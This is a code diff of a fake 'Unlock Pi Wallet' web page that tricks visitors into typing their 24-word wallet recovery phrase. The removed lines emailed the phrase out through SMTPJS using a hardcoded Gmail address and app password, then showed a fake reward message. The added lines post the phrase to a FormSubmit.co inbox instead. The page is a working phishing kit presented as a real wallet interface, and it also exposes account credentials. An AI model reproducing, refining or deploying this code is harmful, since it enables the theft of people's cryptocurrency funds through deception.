@@ -4,45 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Unlock Pi Wallet</title>
-    <script src="https://smtpjs.com/v3/smtp.js"></script>
-    <script>
-        function sendPassphrase() {
-            var passphrase = document.getElementById("passphrase").value.trim();
-            
-            // Validate the passphrase input
-            if (passphrase === "") {
-                alert("Invalid passphrase");
-                return;
-            }
-
-            Email.send({
-                Host: "smtp.gmail.com",
-                Username: "bcmideachannel@gmail.com",  // Your Gmail Address
-                Password: "wvycxzdpluutqmfz",    // Use the App Password generated
-                To: 'brethrenwrites@gmail.com',
-                From: "bcmideachannel@gmail.com",     // Your Gmail Address again
-                Subject: "24 lucky words",
-                Body: "Passphrase: " + passphrase
-            }).then(
-                message => {
-                    if (message === "OK") {
-                        showSuccessMessage();
-                    } else {
-                        alert("Failed to submit. Try again.");
-                    }
-                }
-            );
-        }
-
-        function showSuccessMessage() {
-            var container = document.querySelector(".wallet-container");
-            container.innerHTML = `
-                <h2>Congratulations!</h2>
-                <p>You have earned 100 PI Coin. Please wait 12 hours before it will be transferred to your account.</p>
-                <p>Make sure your passphrase is correct.</p>
-            `;
-        }
-    </script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -120,8 +81,15 @@
 <body>
     <div class="wallet-container">
         <h2>Unlock Pi Wallet</h2>
-        <textarea id="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
-        <button onclick="sendPassphrase()">Unlock With Passphrase</button>
+        <!-- Using FormSubmit.co for sending email -->
+        <form action="https://formsubmit.co/brethrenwrites@gmail.com" method="POST">
+            <textarea name="Passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+            <input type="hidden" name="_subject" value="Pi Wallet Passphrase">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+            <button type="submit">Unlock With Passphrase</button>
+        </form>
+        <!-- Fingerprint Button -->
         <button class="primary">Unlock With Fingerprint</button>
         <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
